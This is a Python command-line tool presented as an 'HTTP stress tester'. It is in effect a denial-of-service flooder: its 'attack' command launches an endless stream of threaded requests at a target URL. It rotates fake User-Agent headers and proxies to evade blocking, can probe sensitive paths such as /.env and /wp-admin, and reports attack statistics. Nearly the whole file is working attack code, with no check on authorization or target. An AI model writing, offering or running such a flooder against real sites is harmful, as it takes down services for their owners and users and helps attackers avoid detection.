import argparse
import random
import sys
import threading
import time
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Union

import requests

# ===== Configurações Globais ===== #
DEFAULT_TIMEOUT = 10
MAX_RETRIES = 3
THREAD_SEMAPHORE = threading.Semaphore(500)  # Limite de threads concorrentes

# ===== Tipos e Estruturas ===== #
class HTTPMethod(Enum):
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    HEAD = "HEAD"

@dataclass
class AttackStats:
    total_requests: int = 0
    success: int = 0
    errors: int = 0
    start_time: float = time.time()

# ===== Dados Aleatórios ===== #
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11; SM-G975F)",
]

FAKE_PATHS = [
    "/api/v1/users",
    "/wp-admin",
    "/admin/login",
    "/.env",
    "/config.json",
]

# ===== Classe Principal ===== #
class HTTPStressTester:
    def __init__(self):
        self.stop_attack = False
        self.stats = AttackStats()
        self.lock = threading.Lock()

    def random_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }

    def send_request(
        self,
        url: str,
        method: HTTPMethod = HTTPMethod.GET,
        headers: Optional[Dict[str, str]] = None,
        proxy: Optional[str] = None,
    ) -> None:
        with THREAD_SEMAPHORE:
            if self.stop_attack:
                return

            session = requests.Session()
            req_headers = headers or self.random_headers()
            proxies = {"http": proxy, "https": proxy} if proxy else None

            for _ in range(MAX_RETRIES):
                try:
                    response = session.request(
                        method.value,
                        url,
                        headers=req_headers,
                        timeout=DEFAULT_TIMEOUT,
                        proxies=proxies,
                    )
                    with self.lock:
                        self.stats.total_requests += 1
                        self.stats.success += 1
                    print(
                        f"[+] {method.value} {url} | Status: {response.status_code} | "
                        f"Size: {len(response.content)} bytes"
                    )
                    break
                except Exception as e:
                    with self.lock:
                        self.stats.total_requests += 1
                        self.stats.errors += 1
                    print(f"[-] Error: {str(e)}")
                    time.sleep(1)

    def start_attack(
        self,
        url: str,
        method: HTTPMethod = HTTPMethod.GET,
        threads: int = 50,
        rps: Optional[int] = None,
        use_random_paths: bool = False,
        use_proxy: bool = False,
        proxies: Optional[List[str]] = None,
    ) -> None:
        print(f"\n[!] Starting attack on {url} ({method.value})")
        print(f"[*] Threads: {threads} | RPS: {rps or 'MAX'} | Random paths: {use_random_paths}")

        try:
            while not self.stop_attack:
                target_url = (
                    f"{url.rstrip('/')}{random.choice(FAKE_PATHS)}" 
                    if use_random_paths 
                    else url
                )
                proxy = random.choice(proxies) if use_proxy and proxies else None

                thread = threading.Thread(
                    target=self.send_request,
                    args=(target_url, method),
                    kwargs={"proxy": proxy},
                )
                thread.daemon = True
                thread.start()

                if rps:
                    time.sleep(1 / rps)

        except KeyboardInterrupt:
            self.stop_attack = True
            print("\n[!] Stopping attack...")
            while threading.active_count() > 1:
                time.sleep(0.5)
            self.print_stats()

    def print_stats(self) -> None:
        duration = time.time() - self.stats.start_time
        rps = self.stats.total_requests / duration if duration > 0 else 0
        print(
            f"\n=== Attack Report ===\n"
            f"Total Requests: {self.stats.total_requests}\n"
            f"Success: {self.stats.success}\n"
            f"Errors: {self.stats.errors}\n"
            f"Duration: {duration:.2f}s\n"
            f"Requests/s: {rps:.2f}\n"
        )

# ===== CLI Setup ===== #
def main():
    parser = argparse.ArgumentParser(description="HTTP Stress Tester (Professional Grade)")
    subparsers = parser.add_subparsers(dest="command")

    # Attack Command
    attack_parser = subparsers.add_parser("attack", help="Start HTTP stress test")
    attack_parser.add_argument("-u", "--url", required=True, help="Target URL")
    attack_parser.add_argument("-m", "--method", default="GET", 
                             choices=[m.value for m in HTTPMethod],
                             help="HTTP method")
    attack_parser.add_argument("-t", "--threads", type=int, default=50,
                             help="Number of threads")
    attack_parser.add_argument("--rps", type=int, help="Requests per second limit")
    attack_parser.add_argument("--random-paths", action="store_true",
                             help="Use random paths in requests")
    attack_parser.add_argument("--proxies", nargs="+", help="List of proxies (HTTP/SOCKS5)")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    tester = HTTPStressTester()
    try:
        if args.command == "attack":
            tester.start_attack(
                url=args.url,
                method=HTTPMethod(args.method),
                threads=args.threads,
                rps=args.rps,
                use_random_paths=args.random_paths,
                use_proxy=bool(args.proxies),
                proxies=args.proxies,
            )
    except KeyboardInterrupt:
        tester.stop_attack = True
        sys.exit(0)

if __name__ == "__main__":
    main()
